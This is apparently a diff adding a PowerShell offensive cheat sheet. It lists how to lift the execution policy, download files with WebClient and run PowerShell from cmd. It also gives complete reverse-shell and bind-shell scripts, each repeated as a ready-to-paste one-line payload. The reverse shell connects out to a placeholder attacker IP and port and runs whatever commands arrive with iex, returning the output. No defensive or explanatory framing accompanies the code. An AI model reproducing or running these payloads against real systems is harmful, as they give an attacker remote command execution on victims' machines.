@@ -1,0 +1,71 @@
+=========================
+remove restriction policy
+=========================
+Set-ExecutionPolicy Unrestricted
+
+=============
+file transfer
+=============
+sender
+	open web server
+receiver
+	(new-object System.Net.WebClient).DownloadFile('<from>', '<to>')
+
+==============
+execute in cmd
+==============
+powershell -c "<powershell command>"
+
+=============
+reverse shell
+=============
+attacker
+	open a listening port
+victim
+	$client = New-Object System.Net.Sockets.TCPClient('<attacker ip>', <attacker port>);
+	$stream = $client.GetStream();
+	[byte[]]$bytes = 0..65535|%{0};
+	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+	{
+		$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+		$sendback = (iex $data 2>&1 | Out-String );
+		$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+		$stream.Write($sendbyte,0,$sendbyte.Length);
+		$stream.Flush();
+	}
+	$client.Close();
+
+==========
+bind shell
+==========
+attacker
+	connect to the victim
+victim
+	$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', <port>);
+	$listener.start();
+	$client = $listener.AcceptTcpClient();
+	$stream = $client.GetStream();
+	[byte[]]$bytes = 0..65535|%{0};
+	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+	{
+		$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+		$sendback = (iex $data 2>&1 | Out-String );
+		$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+		$stream.Write($sendbyte, 0, $sendbyte.Length);
+		$stream.Flush();
+	}
+	$client.Close();
+	$listener.Stop();
+
+=====================
+reverse shell payload
+=====================
+$client = New-Object System.Net.Sockets.TCPClient('<attacker ip>', <attacker port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();
+
+==================
+bind shell payload
+==================
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', <port>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close();$listener.Stop();
+
